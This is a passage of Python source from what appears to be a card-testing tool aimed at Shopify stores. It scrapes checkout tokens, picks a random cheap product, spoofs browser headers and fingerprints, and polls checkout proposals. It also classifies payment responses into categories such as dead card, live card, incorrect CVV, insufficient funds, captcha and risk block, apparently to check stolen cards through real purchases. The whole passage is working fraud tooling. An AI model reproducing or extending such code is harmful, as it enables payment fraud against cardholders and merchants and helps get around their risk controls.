        r'<meta\s+name="serialized-sourceToken"\s+content="([^"]*)"',
        h
    )
    return html.unescape(m.group(1)).strip('"') if m else ""


def eyelifter_scrape_pat_id(h):
    u = html.unescape(h)
    m = re.search(r'"checkoutSessionIdentifier"\s*:\s*"([a-f0-9]+)"', u)
    return m.group(1) if m else ""


def eyelifter_scrape_ident_sig(h):
    u = h.replace("&quot;", '"')
    for pat in [
        r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"',
        r'"identification_signature"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pat, u)
        if m:
            return m.group(1)
    return ""


def eyelifter_scrape_vault_url(h):
    d = h.replace("&quot;", '"')
    m = re.search(
        r'(https://(?:[a-z0-9-]+\.)*(?:shopifycs|shopifyinc)\.com/sessions)',
        d
    )
    return m.group(1) if m else ""
def eyelifter_scrape_payment_terms_id(b):
    try:
        d = json.loads(b)
    except Exception:
        d = None
    if isinstance(d, dict):
        seller = eyelifter_dig(
            d, "data", "session", "negotiate", "result", "sellerProposal"
        ) or {}
        pt = seller.get("paymentFlexibilityPaymentTermsTemplate")
        if isinstance(pt, dict):
            return pt.get("id", "")
    m = re.search(
        r'"paymentFlexibilityPaymentTermsTemplate"\s*:\s*\{[^}]*?"id"\s*:\s*"([^"]+)"',
        b
    )
    return m.group(1) if m else ""

def eyelifter_scrape_checkpoint(b):
    m = re.search(r'"checkpointData"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


def eyelifter_scrape_queue_token(b):
    m = re.search(r'"queueToken"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""

def eyelifter_scrape_gateway(b):
    if not b:
        return ""
    try:
        d = json.loads(b)
    except Exception:
        d = None

    if isinstance(d, dict):
        seller = eyelifter_dig(
            d, "data", "session", "negotiate", "result", "sellerProposal"
        ) or {}
        payment = seller.get("payment") or {}
        if isinstance(payment, dict) and payment.get("__typename") == "FilledPaymentTerms":
            chosen = None
            for line in (payment.get("availablePaymentLines") or []):
                if not isinstance(line, dict):
                    continue
                pm = line.get("paymentMethod") or {}
                if not isinstance(pm, dict):
                    continue
                name = pm.get("extensibilityDisplayName") or pm.get("name")
                if not (isinstance(name, str) and name.strip()):
                    continue
                brands = pm.get("paymentBrands") or pm.get("brands") or []
                if isinstance(brands, list) and brands:
                    return name.strip()
                if chosen is None:
                    chosen = name.strip()
            if chosen:
                return chosen

    for pat in (
        r'"extensibilityDisplayName"\s*:\s*"([^"]+)"',
        r'"paymentMethod"\s*:\s*\{[^{}]*?"name"\s*:\s*"([^"]+)"',
    ):
        m = re.search(pat, b)
        if m:
            v = m.group(1).strip()
            if v:
                return v

    return ""
    
def eyelifter_scrape_payment_method_id(b):
    m = re.search(r'"paymentMethodIdentifier"\s*:\s*"([a-f0-9]{32})"', b)
    return m.group(1) if m else ""


def eyelifter_scrape_profile_id(b):
    m = re.search(r'"configurationRecordId"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


def eyelifter_scrape_supported_countries(b):
    countries = []
    for m in re.finditer(r'"supportedCountries"\s*:\s*\[([^\]]+)\]', b):
        for code in re.findall(r'"([A-Z]{2})"', m.group(1)):
            if code not in countries:
                countries.append(code)
    return countries


def eyelifter_scrape_delivery_handle(b):
    try:
        d = json.loads(b)
        seller = eyelifter_dig(
            d, "data", "session", "negotiate", "result", "sellerProposal"
        ) or {}
        dlv = seller.get("delivery", {})
        h = dlv.get("selectedDeliveryStrategy", {}).get("handle", "")
        if h:
            return h
        h = dlv.get("deliveryStrategyHandle", "")
        if h:
            return h
        for line in dlv.get("deliveryLines", []):
            for macro in line.get("deliveryMacros", []):
                handles = macro.get("deliveryStrategyHandles", [])
                if handles:
                    return handles[0]
    except Exception:
        pass
    for pat in [
        r'"selectedDeliveryStrategy"\s*:\s*\{\s*"handle"\s*:\s*"([^"]+)"',
        r'"deliveryStrategyHandle"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pat, b)
        if m:
            return m.group(1)
    return ""


def eyelifter_scrape_signed_handles(b):
    try:
        d = json.loads(b)
        seller = eyelifter_dig(
            d, "data", "session", "negotiate", "result", "sellerProposal"
        ) or {}
        de = seller.get("deliveryExpectations", {})
        de_typ = de.get("__typename", "")
        if de_typ == "FilledDeliveryExpectationTerms":
            return [
                x["signedHandle"]
                for x in de.get("deliveryExpectations", [])
                if x.get("signedHandle")
            ]
        if de_typ == "FilledDeliveryTerms":
            return []
        if "deliveryExpectations" in de:
            exps = de.get("deliveryExpectations", [])
            if isinstance(exps, list):
                return [
                    x.get("signedHandle")
                    for x in exps
                    if x.get("signedHandle")
                ]
    except Exception:
        pass
    return []


def eyelifter_scrape_tax(b):
    try:
        d = json.loads(b)
        val = eyelifter_dig(
            d, "data", "session", "negotiate", "result", "sellerProposal",
            "tax", "totalTaxAmount", "value"
        ) or {}
        return val.get("amount", "0.0")
    except Exception:
        return "0.0"


def eyelifter_scrape_total(b):
    for key in ("checkoutTotal", "total", "runningTotal"):
        m = re.search(
            rf'"{key}"\s*:\s*\{{\s*"value"\s*:\s*\{{\s*"amount"\s*:\s*"([^"]+)"',
            b
        )
        if m:
            cur = re.search(
                rf'"{key}".{{0,300}}?"currencyCode"\s*:\s*"([^"]+)"',
                b
            )
            return {
                "amount": m.group(1),
                "currencyCode": cur.group(1) if cur else "USD",
            }
    try:
        d = json.loads(b)
        for path in [
            ("data", "session", "negotiate", "result", "sellerProposal",
             "checkoutTotal", "value"),
            ("data", "session", "negotiate", "result", "sellerProposal",
             "total", "value"),
            ("data", "session", "negotiate", "result", "sellerProposal",
             "runningTotal", "value"),
        ]:
            v = eyelifter_dig(d, *path)
            if isinstance(v, dict) and v.get("amount"):
                return {
                    "amount": v["amount"],
                    "currencyCode": v.get("currencyCode", "USD"),
                }
    except Exception:
        pass
    return None


def eyelifter_scrape_currency(b):
    m = re.search(r'"presentmentCurrency"\s*:\s*"([A-Z]{3})"', b)
    if m:
        return m.group(1)
    m = re.search(r'"supportedCurrencies"\s*:\s*\[\s*"([A-Z]{3})"', b)
    return m.group(1) if m else ""

def eyelifter_resolve_currency(client, shop_url, handle, checkout_html, p1_body):
    sources = {}

    if handle:
        try:
            r = client.eyelifter_get(
                f"{shop_url}/products/{handle}.js",
                headers={"accept": "*/*"}, timeout=8,
            )
            if r.status_code == 200:
                d = r.json()
                c = d.get("currency")
                if isinstance(c, str) and len(c) == 3:
                    sources["js_product"] = c.upper()
        except Exception:
            pass

    try:
        r = client.eyelifter_get(f"{shop_url}/cart.js",
                                 headers={"accept": "*/*"}, timeout=8)
        if r.status_code == 200:
            d = r.json()
            c = d.get("currency")
            if isinstance(c, str) and len(c) == 3:
                sources["cart_js"] = c.upper()
    except Exception:
        pass

    if checkout_html:
        for label, pat in (
            ("html_presentment", r'"presentmentCurrency"\s*:\s*"([A-Z]{3})"'),
            ("html_active", r'"activeCurrencyCode"\s*:\s*"([A-Z]{3})"'),
            ("html_currency", r'"currencyCode"\s*:\s*"([A-Z]{3})"'),
        ):
            m = re.search(pat, checkout_html)
            if m:
                sources[label] = m.group(1)
                break

    if p1_body:
        m = re.search(r'"presentmentCurrency"\s*:\s*"([A-Z]{3})"', p1_body)
        if m:
            sources["p1_presentment"] = m.group(1)
        m = re.search(r'"supportedCurrencies"\s*:\s*\[\s*"([A-Z]{3})"', p1_body)
        if m:
            sources["p1_supported"] = m.group(1)
        if "BUYER_IDENTITY_CURRENCY_NOT_SUPPORTED_BY_SHOP" in p1_body:
            m = re.search(r'(?:now in|now available in)\s+([A-Z]{3})', p1_body)
            if m:
                sources["p1_forced"] = m.group(1)

    if not sources:
        return "USD", "low", sources

    from collections import Counter
    counts = Counter(sources.values())
    top_val, top_count = counts.most_common(1)[0]

    if top_count >= 2:
        return top_val, "high", sources

    for priority in ("html_presentment", "html_active", "js_product",
                     "cart_js", "p1_forced", "p1_presentment",
                     "p1_supported", "html_currency"):
        if priority in sources:
            return sources[priority], "medium", sources

    return top_val, "low", sources


def eyelifter_detect_currency(client, checkout_html, shop_url, handle=None, p1_body=None):
    cur, conf, _ = eyelifter_resolve_currency(
        client, shop_url, handle, checkout_html, p1_body)
    return cur


def eyelifter_resolve_price(p4_body):
    try:
        d = json.loads(p4_body)
    except Exception:
        d = None

    seller = None
    if isinstance(d, dict):
        seller = eyelifter_dig(
            d, "data", "session", "negotiate", "result", "sellerProposal")

    if seller:
        ct = seller.get("checkoutTotal", {})
        if isinstance(ct, dict) and isinstance(ct.get("value"), dict):
            v = ct["value"]
            if v.get("amount") and v.get("currencyCode"):
                return v["amount"], v["currencyCode"], "checkoutTotal"

        pt = seller.get("payment", {}).get("totalAmount", {})
        if isinstance(pt, dict) and isinstance(pt.get("value"), dict):
            v = pt["value"]
            if v.get("amount") and v.get("currencyCode"):
                return v["amount"], v["currencyCode"], "payment.totalAmount"

        rt = seller.get("runningTotal", {})
        if isinstance(rt, dict) and isinstance(rt.get("value"), dict):
            v = rt["value"]
            if v.get("amount") and v.get("currencyCode"):
                dlv = seller.get("delivery", {})
                dlv_pending = isinstance(dlv, dict) and dlv.get("__typename") == "PendingTerms"
                if not dlv_pending:
                    return v["amount"], v["currencyCode"], "runningTotal"

        subtotal = eyelifter_dig(
            seller, "subtotalBeforeTaxesAndShipping", "value", "amount")
        if subtotal:
            tax = (eyelifter_dig(seller, "tax", "totalTaxAmount", "value", "amount")
                   or "0.0")
            shipping = "0.0"
            dlv = seller.get("delivery", {})
            if isinstance(dlv, dict) and dlv.get("__typename") == "FilledDeliveryTerms":
                for line in dlv.get("deliveryLines", []):
                    sd = line.get("selectedDeliveryStrategy", {})
                    h = sd.get("handle")
                    for strat in line.get("availableDeliveryStrategies", []):
                        if strat.get("handle") == h:
                            shipping = (eyelifter_dig(strat, "amount", "value", "amount")
                                        or "0.0")
                            break
            try:
                total = float(subtotal) + float(shipping) + float(tax)
                cur = (eyelifter_dig(seller, "runningTotal", "value", "currencyCode")
                       or "USD")
                return f"{total:.2f}", cur, "computed"
            except (ValueError, TypeError):
                pass

    for key in ("checkoutTotal", "runningTotal", "total"):
        m = re.search(
            rf'"{key}"\s*:\s*\{{[^{{}}]*?"value"\s*:\s*\{{[^{{}}]*?"amount"\s*:\s*"([^"]+)"[^{{}}]*?"currencyCode"\s*:\s*"([^"]+)"',
            p4_body,
        )
        if m:
            return m.group(1), m.group(2), f"{key}_regex"

    return None, None, None


def eyelifter_wait_for_final_p4(client, checkout_url, checkout_token, session_token,
                                  stable_id, variant_id, build_id, source_token,
                                  queue_token, email, addr, currency, country,
                                  initial_p4, max_polls=20):
    p4 = initial_p4
    last_qt = eyelifter_scrape_queue_token(p4) or queue_token
    was_pending = False

    for poll_n in range(max_polls):
        try:
            d = json.loads(p4)
        except Exception:
            d = None

        settled = False
        if isinstance(d, dict):
            seller = eyelifter_dig(
                d, "data", "session", "negotiate", "result", "sellerProposal") or {}
            if seller:
                dlv = seller.get("delivery", {})
                dlv_pending = isinstance(dlv, dict) and dlv.get("__typename") == "PendingTerms"
                tax = seller.get("tax", {})
                tax_pending = isinstance(tax, dict) and tax.get("__typename") == "PendingTerms"
                de = seller.get("deliveryExpectations", {})
                de_pending = isinstance(de, dict) and de.get("__typename") == "PendingTerms"
                ct = seller.get("checkoutTotal", {})
                ct_missing = isinstance(ct, dict) and not ct.get("value")
                settled = not (dlv_pending or tax_pending or de_pending or ct_missing)

        if settled:
            if was_pending:
                time.sleep(0.5)
                _, p4_check = eyelifter_send_proposal(
                    client, checkout_url, checkout_token, session_token,
                    stable_id, variant_id, build_id, source_token,
                    last_qt, email, addr, currency, country, "address")
                new_qt = eyelifter_scrape_queue_token(p4_check)
                if new_qt and p4_check.strip():
                    last_qt = new_qt
                    p4 = p4_check
            return p4

        was_pending = True
        delays = [int(x) for x in re.findall(r'"pollDelay"\s*:\s*(\d+)', p4)]
        wait = (max(delays) / 1000.0) if delays else 0.5
        time.sleep(max(wait, 0.4))

        _, p4_new = eyelifter_send_proposal(
            client, checkout_url, checkout_token, session_token,
            stable_id, variant_id, build_id, source_token,
            last_qt, email, addr, currency, country, "address")

        new_qt = eyelifter_scrape_queue_token(p4_new)
        if new_qt:
            last_qt = new_qt
            p4 = p4_new
        elif p4_new.strip():
            p4 = p4_new

    return p4
    
def eyelifter_scrape_shipping_required(b):
    try:
        d = json.loads(b)
        seller = eyelifter_dig(
            d, "data", "session", "negotiate", "result", "sellerProposal"
        ) or {}
        if "isShippingRequired" in seller:
            return bool(seller["isShippingRequired"])
    except Exception:
        pass
    for sig in (
        '"requiresShipping":false',
        '"giftCard":true',
        '"isShippingRequired":false',
    ):
        if sig in b:
            return False
    return True


def eyelifter_has_shipping_restriction(b):
    sigs = [
        "SHIPPING_ADDRESS_UNDELIVERABLE",
        "no_delivery_options_available",
        "delivery is not available",
        "does not ship to",
    ]
    low = b.lower()
    return any(s.lower() in low for s in sigs)


def eyelifter_scrape_proposal_captcha(b):
    try:
        d = json.loads(b)
    except Exception:
        return None
    seller = eyelifter_dig(
        d, "data", "session", "negotiate", "result", "sellerProposal"
    ) or {}
    cap = seller.get("captcha")
    if not isinstance(cap, dict):
        return None
    if cap.get("provider") and cap.get("sitekey"):
        return {
            "provider": cap.get("provider"),
            "sitekey": cap.get("sitekey"),
            "challenge": cap.get("challenge"),
        }
    return None


def eyelifter_scrape_receipt_id(b):
    m = re.search(
        r'"id"\s*:\s*"(gid://shopify/\w+Receipt/[A-Za-z0-9]+)"',
        b
    )
    return m.group(1) if m else ""


def eyelifter_scrape_receipt_token(b):
    try:
        d = json.loads(b)
        v = eyelifter_dig(
            d, "data", "submitForCompletion", "receipt", "sessionToken"
        )
        if isinstance(v, str) and v:
            return v
    except Exception:
        pass
    m = re.search(
        r'"receipt"\s*:\s*\{[^{}]*?"sessionToken"\s*:\s*"([^"]+)"',
        b
    )
    if m:
        return m.group(1)
    m = re.search(r'"sessionToken"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


def eyelifter_scrape_pci_id(b):
    m = re.search(r'"id"\s*:\s*"([^"]+)"', b)
    return m.group(1) if m else ""


def eyelifter_extract_totals_from_error(body):
    out = {}
    try:
        d = json.loads(body)
    except Exception:
        d = None

    seller = {}
    if isinstance(d, dict):
        for path in [
            ("data", "submitForCompletion", "sellerProposal"),
            ("data", "submitForCompletion", "receipt", "sellerProposal"),
            ("data", "receipt", "sellerProposal"),
        ]:
            seller = eyelifter_dig(d, *path) or {}
            if seller:
                break

    if seller:
        for k in ("checkoutTotal", "total", "runningTotal"):
            v = seller.get(k, {}).get("value", {})
            if isinstance(v, dict) and v.get("amount"):
                try:
                    float(v["amount"])
                    out[k] = {
                        "amount": v["amount"],
                        "currencyCode": v.get("currencyCode", "USD"),
                    }
                except (ValueError, TypeError):
                    pass
        tax = eyelifter_dig(seller, "tax", "totalTaxAmount", "value") or {}
        if tax.get("amount"):
            out["tax"] = {
                "amount": tax["amount"],
                "currencyCode": tax.get("currencyCode", "USD"),
            }

    if not out:
        for key in ("checkoutTotal", "total", "runningTotal"):
            m = re.search(
                rf'"{key}"\s*:\s*\{{\s*"value"\s*:\s*\{{\s*"amount"\s*:\s*"([^"]+)"',
                body
            )
            if m:
                cm = re.search(
                    rf'"{key}".{{0,300}}?"currencyCode"\s*:\s*"([^"]+)"',
                    body
                )
                try:
                    float(m.group(1))
                    out[key] = {
                        "amount": m.group(1),
                        "currencyCode": cm.group(1) if cm else "USD",
                    }
                    break
                except (ValueError, TypeError):
                    pass
        tax_m = re.search(
            r'"totalTaxAmount"\s*:\s*\{[^{}]*?"amount"\s*:\s*"([^"]+)"',
            body
        )
        if tax_m:
            try:
                float(tax_m.group(1))
                out["tax"] = {"amount": tax_m.group(1), "currencyCode": "USD"}
            except (ValueError, TypeError):
                pass

    return out


def eyelifter_match_error_kw(raw):
    low = raw.lower()
    for kw, code in [
        ("captcha", "CAPTCHA_REQUIRED"),
        ("captcha_metadata_missing", "CAPTCHA_REQUIRED"),
        ("risky", "RISK_REJECTED"),
        ("card declined", "CARD_DECLINED"),
        ("not a credit card", "NUMBER_INVALID"),
        ("incorrect number", "INCORRECT_NUMBER"),
        ("no_available_delivery", "NO_DELIVERY"),
        ("sum_of_proposed", "AMOUNT_MISMATCH"),
        ("cannot cover", "AMOUNT_MISMATCH"),
        ("order total has changed", "AMOUNT_MISMATCH"),
        ("new_tax_line", "TAX_MISMATCH"),
        ("currency_you_selected", "CURRENCY_MISMATCH"),
        ("issue processing your payment", "CARD_DECLINED"),
        ("try again or use a different payment", "CARD_DECLINED"),
        ("generic_error", "GENERIC_ERROR"),
        ("generic error", "GENERIC_ERROR"),
        ("payment_failed", "PAYMENT_FAILED"),
        ("insufficient funds", "INSUFFICIENT_FUNDS"),
        ("incorrect cvc", "INCORRECT_CVC"),
        ("incorrect cvv", "INCORRECT_CVV"),
        ("verification_value_invalid", "INCORRECT_CVV"),
        ("requested payment method is not available", "PAYMENT_METHOD_UNAVAILABLE"),
        ("payment flexibility", "PAYMENT_TERMS_MISMATCH"),
        ("waiting for pending", "PENDING_TERMS"),
        ("no available delivery strategy", "NO_DELIVERY"),
        ("required artifacts", "ARTIFACTS_UNAVAILABLE"),
        ("buyer_identity_currency", "CURRENCY_MISMATCH"),
        ("buyer identity currency", "CURRENCY_MISMATCH"),
    ]:
        if kw in low:
            return code
    return ""


def eyelifter_map_error(b):
    try:
        d = json.loads(b)
    except Exception:
        d = None
    if isinstance(d, dict):
        top = d.get("errors")
        if isinstance(top, list) and top:
            for e in top:
                if isinstance(e, dict):
                    for k in ("nonLocalizedMessage", "code", "message"):
                        v = e.get(k)
                        if isinstance(v, str) and v.strip():
                            code = eyelifter_match_error_kw(v)
                            if code:
                                return code
        inner = eyelifter_dig(
            d, "data", "submitForCompletion", "errors"
        ) or []
        if isinstance(inner, list) and inner:
            for e in inner:
                if isinstance(e, dict):
                    for k in ("nonLocalizedMessage", "code", "message"):
                        v = e.get(k)
                        if isinstance(v, str) and v.strip():
                            code = eyelifter_match_error_kw(v)
                            if code:
                                return code
    for pat in [
        r'"nonLocalizedMessage"\s*:\s*"([^"]+)"',
        r'"code"\s*:\s*"([^"]+)"',
        r'"message"\s*:\s*"([^"]+)"',
    ]:
        m = re.search(pat, b)
        if m:
            code = eyelifter_match_error_kw(m.group(1))
            if code:
                return code
    return ""


def eyelifter_classify_code(code):
    if not code:
        return "UNKNOWN"
    up = code.upper().replace(" ", "_")
    if up in eyelifter_DEAD_CARD_CODES:
        return "DEAD_CARD"
    if up in eyelifter_LIVE_CODES:
        return eyelifter_LIVE_CODES[up]
    if up in eyelifter_DECLINE_CODES:
        return "DECLINED"
    if "CAPTCHA" in up or "HCAPTCHA" in up:
        return "CAPTCHA"
    if "RISK" in up:
        return "RISK_BLOCKED"
    return "FAILED"


def eyelifter_gql_headers(client, checkout_url, checkout_token,
                           session_token, build_id, source_token):
    p = urllib.parse.urlparse(checkout_url)
    host = p.netloc
    origin = f"{p.scheme}://{host}"
    h = {
        "authority": host,
        "accept": "application/json",
        "accept-language": "en-US",
        "content-type": "application/json",
        "origin": origin,
        "referer": checkout_url,
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-origin",
        "shopify-checkout-client": "checkout-web/1.0",
        "shopify-checkout-source": f'id="{checkout_token}", type="cn"',
        "x-checkout-web-deploy-stage": "production",
        "x-checkout-web-server-handling": "fast",
        "x-checkout-web-server-rendering": "yes",
        "x-checkout-web-source-id": checkout_token,
        "x-request-id": str(uuid.uuid4()),
    }
    if session_token:
        h["x-checkout-one-session-token"] = session_token
    if build_id:
        h["x-checkout-web-build-id"] = build_id
    if not getattr(client, "_cffi_active", False):
        ua = getattr(client, "ua", eyelifter_UA)
        h["user-agent"] = ua
        ch, mob, plat = eyelifter_fp_from_ua(ua)
        if ch:
            h["sec-ch-ua"] = ch
            h["sec-ch-ua-mobile"] = mob
            h["sec-ch-ua-platform"] = plat
    return h


def eyelifter_products_request(client, url):
    # Fix F: no shared-session header mutation. Per-request headers only.
    r = client.eyelifter_get(
        url,
        headers={
            "accept": "*/*",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
        },
        timeout=10
    )
    if r.status_code != 200:
        return None, f"HTTP {r.status_code}"
    ct = (r.headers.get("content-type") or "").lower()
    if "json" not in ct:
        return None, f"ct={ct[:30]}"
    try:
        data = r.json()
    except Exception as e:
        return None, f"json: {str(e)[:40]}"
    if not isinstance(data, dict):
        return None, "not dict"
    prods = data.get("products") or data.get("results") or []
    if not isinstance(prods, list) or not prods:
        return None, "empty"
    return prods, None


def eyelifter_fetch_js_price(client, shop_url, handle):
    if not handle:
        return None, None
    try:
        r = client.eyelifter_get(
            f"{shop_url}/products/{handle}.js",
            headers={"accept": "*/*"},
            timeout=10
        )
    except Exception:
        return None, None
    if r.status_code != 200:
        return None, None
    try:
        data = r.json()
    except Exception:
        return None, None
    for v in data.get("variants", []) or []:
        try:
            pv = float(v.get("price") or 0)
            if pv > 0:
                return pv, data.get("currency")
        except (ValueError, TypeError):
            continue
    return None, None


def eyelifter_fetch_html_price(client, shop_url, handle):
    if not handle:
        return None, None
    try:
        r = client.eyelifter_get(
            f"{shop_url}/products/{handle}",
            headers={"accept": "*/*"},
            timeout=12
        )
    except Exception:
        return None, None
    if r.status_code != 200:
        return None, None
    text = r.text
    for m in re.finditer(
        r'<script\s+type=["\']application/ld\+json["\']>(.*?)</script>',
        text,
        re.DOTALL | re.IGNORECASE
    ):
        try:
            ld = json.loads(m.group(1))
        except Exception:
            continue
        cands = []
        if isinstance(ld, dict):
            if "offers" in ld:
                cands.append(ld["offers"])
            if "price" in ld and "priceCurrency" in ld:
                cands.append({
                    "price": ld["price"],
                    "priceCurrency": ld["priceCurrency"],
                })
        elif isinstance(ld, list):
            for it in ld:
                if isinstance(it, dict) and "offers" in it:
                    cands.append(it["offers"])
        for offer in cands:
            if isinstance(offer, list) and offer:
                offer = offer[0]
            if isinstance(offer, dict):
                p = offer.get("price") or offer.get("lowPrice")
                if p is not None:
                    try:
                        pv = float(str(p).replace(",", ""))
                        if pv > 0:
                            return pv, offer.get("priceCurrency")
                    except (ValueError, TypeError):
                        pass
    m = re.search(
        r'<meta\s+property=["\']product:price:amount["\']\s+content=["\']([\d.]+)["\']',
        text,
        re.IGNORECASE
    )
    if m:
        try:
            pv = float(m.group(1))
            if pv > 0:
                cm = re.search(
                    r'<meta\s+property=["\']product:price:currency["\']\s+content=["\']([A-Z]{3})["\']',
                    text,
                    re.IGNORECASE
                )
                return pv, (cm.group(1) if cm else None)
        except (ValueError, TypeError):
            pass
    for m in re.finditer(
        r'data-product-price=["\']([\d.]+)["\']',
        text,
        re.IGNORECASE
    ):
        try:
            pv = float(m.group(1))
            if pv > 0:
                return pv, None
        except (ValueError, TypeError):
            pass
    m = re.search(
        r'ShopifyAnalytics\.meta\s*=\s*\{(.*?)\}\s*</script>',
        text,
        re.DOTALL
    )
    if m:
        pm = re.search(r'"price"\s*:\s*([\d]+(?:\.[\d]+)?)', m.group(1))
        if pm:
            try:
                pv = float(pm.group(1))
                if 0 < pv <= 100000:
                    return pv, None
            except (ValueError, TypeError):
                pass
    return None, None


def eyelifter_fetch_cart_price(client, shop_url, variant_id):
    if not variant_id:
        return None, None, None
    try:
        r = client.eyelifter_post(
            f"{shop_url}/cart/add.js",
            data={"id": variant_id, "quantity": 1},
            headers={
                "accept": "*/*",
                "content-type": "application/x-www-form-urlencoded",
                "origin": shop_url,
                "referer": f"{shop_url}/",
                "x-requested-with": "XMLHttpRequest",
            },
            timeout=10,
        )
    except Exception:
        return None, None, None
    if r.status_code not in (200, 201):
        return None, None, None
    try:
        r2 = client.eyelifter_get(
            f"{shop_url}/cart.js",
            headers={"accept": "*/*"},
            timeout=10
        )
    except Exception:
        return None, None, None
    if r2.status_code != 200:
        return None, None, None
    try:
        cart = r2.json()
    except Exception:
        return None, None, None
    items = cart.get("items") or []
    if not items:
        return None, None, None
    item = items[0]
    raw = (
        item.get("final_price") or
        item.get("price") or
        item.get("original_price")
    )
    if not raw:
        return None, None, None
    try:
        pv = float(raw)
        if pv > 1000:
            pv = pv / 100.0
    except (ValueError, TypeError):
        return None, None, None
    if pv <= 0:
        return None, None, None
    return pv, item.get("currency") or cart.get("currency"), cart.get("token")


def eyelifter_storefront_products(client, shop_url):
    for v in (eyelifter_SF_PRIMARY,) + eyelifter_SF_FALLBACK:
        path = (
            "/api/graphql.json"
            if v == "unversioned"
            else f"/api/{v}/graphql.json"
        )
        try:
            r = client.eyelifter_post(
                shop_url + path,
                data=eyelifter_SF_PRODUCTS_QUERY,
                headers={"content-type": "application/json"},
                timeout=10
            )
        except Exception:
            continue
        if r.status_code != 200:
            continue
        try:
            d = r.json()
        except Exception:
            continue
        if d.get("errors"):
            continue
        edges = eyelifter_dig(d, "data", "products", "edges") or []
        if not edges:
            continue
        prods = []
        for edge in edges:
            node = edge.get("node") or {}
            for ve in (node.get("variants", {}).get("edges") or []):
                vn = ve.get("node") or {}
                if not vn.get("availableForSale"):
                    continue
                price_obj = vn.get("price") or {}
                try:
                    pv = float(price_obj.get("amount") or 0)
                except (ValueError, TypeError):
                    continue
                if pv <= 0:
                    continue
                prods.append({
                    "variant_id": (vn.get("id") or "").split("/")[-1],
                    "product_id": (node.get("id") or "").split("/")[-1],
                    "title": node.get("title", ""),
                    "price_f": pv,
                    "handle": node.get("handle", ""),
                    "currency": price_obj.get("currencyCode"),
                })
        if prods:
            return prods
    return None


def eyelifter_find_product(client, shop_url, min_price=None, max_price=None):
    min_price = min_price if min_price is not None else eyelifter_CFG.s.get("min_price", 0.10)
    max_price = max_price if max_price is not None else eyelifter_CFG.s.get("max_price", 100.0)

    candidates = []

    try:
        url = f"{shop_url}/products.json?limit=250"
        prods, _ = eyelifter_products_request(client, url)
        if prods:
            for p in prods:
                for v in p.get("variants", []):
                    if v.get("available") is False:
                        continue
                    try:
                        pf = float(v.get("price") or 0)
                    except (ValueError, TypeError):
                        pf = 0.0
                    candidates.append({
                        "variant_id": str(v["id"]),
                        "product_id": str(p["id"]),
                        "title": p.get("title", ""),
                        "price_f": pf,
                        "handle": p.get("handle", ""),
                        "currency": None,
                    })
    except Exception:
        pass

    if not candidates:
        try:
            url = f"{shop_url}/collections/all/products.json?limit=250"
            prods, _ = eyelifter_products_request(client, url)
            if prods:
                for p in prods:
                    for v in p.get("variants", []):
                        if v.get("available") is False:
                            continue
                        try:
                            pf = float(v.get("price") or 0)
                        except (ValueError, TypeError):
                            pf = 0.0
                        candidates.append({
                            "variant_id": str(v["id"]),
                            "product_id": str(p["id"]),
                            "title": p.get("title", ""),
                            "price_f": pf,
                            "handle": p.get("handle", ""),
                            "currency": None,
                        })
                if candidates:
                    eyelifter_dbg("PRODUCTS", f"collections/all/products.json: {len(candidates)} variants")
        except Exception:
            pass

    if not candidates:
        sf = eyelifter_storefront_products(client, shop_url)
        if sf:
            candidates = sf
            eyelifter_dbg("PRODUCTS", f"storefront: {len(candidates)} variants")

    if not candidates:
        raise RuntimeError("no products from any endpoint")

    non_addon = [
        c for c in candidates
        if not eyelifter_is_addon(c["title"], c["handle"])
    ]
    if non_addon:
        candidates = non_addon

    shippable = [
        c for c in candidates
        if "instore only" not in (c["title"] or "").lower()
        and "in-store only" not in (c["title"] or "").lower()
        and "pickup only" not in (c["title"] or "").lower()
        and "pick up only" not in (c["title"] or "").lower()
    ]
    if shippable:
        candidates = shippable

    priced = [
        c for c in candidates
        if min_price <= c["price_f"] <= max_price
    ]
    if not priced:
        raise Exception(
            f"no products in price range ${min_price:.2f} - ${max_price:.2f}"
        )

    priced.sort(key=lambda x: x["price_f"])
    pool = priced[:min(12, len(priced))]
    pick = random.choice(pool)
    price_val = pick["price_f"]
    currency = pick.get("currency")

    if price_val <= 0.01:
        pv, cur = eyelifter_fetch_js_price(client, shop_url, pick["handle"])
        if pv:
            price_val, currency = pv, cur
        else:
            pv, cur = eyelifter_fetch_html_price(client, shop_url, pick["handle"])
            if pv:
                price_val, currency = pv, cur
            else:
                pv, cur, _ = eyelifter_fetch_cart_price(
                    client, shop_url, pick["variant_id"]
                )
                if pv:
                    price_val, currency = pv, cur

    if not currency:
        _, cur = eyelifter_fetch_js_price(client, shop_url, pick["handle"])
        if cur:
            currency = cur
        else:
            _, cur, _ = eyelifter_fetch_cart_price(client, shop_url, pick["variant_id"])
            if cur:
                currency = cur

    if price_val <= 0.01:
        raise Exception(
            f"could not resolve price for variant {pick['variant_id']}"
        )

    if not (min_price <= price_val <= max_price):
        raise Exception(
            f"resolved price ${price_val:.2f} outside range"
        )

    if not currency:
        currency = eyelifter_detect_currency(client, "", shop_url) or None

    tl = (pick.get("title") or "").lower()
    hints = [
        "compensation", "price difference", "donation", "gift card",
        "giftcard", "add-on", "digital", "download", "subscription",
    ]
    is_dig = any(s in tl for s in hints)
    if price_val <= 1.01:
        is_dig = True

    return (
        pick["title"],
        pick["product_id"],
        pick["variant_id"],
        f"{price_val:.2f}",
        pick["handle"],
        is_dig,
        currency,
    )


def eyelifter_cart_to_checkout(client, shop_url, variant_id, handle, locale=""):
    referer = (
        f"{shop_url}/products/{handle}"
        if handle
        else f"{shop_url}/collections/all"
    )
    r = client.eyelifter_get(
        f"{shop_url}/cart/{variant_id}:1",
        allow_redirects=True,
        headers={
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "referer": referer,
            "cache-control": "no-cache",
            "pragma": "no-cache",
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
        },
        timeout=19
    )
    if r.status_code not in (200, 302):
        raise Exception(f"cart HTTP {r.status_code}")
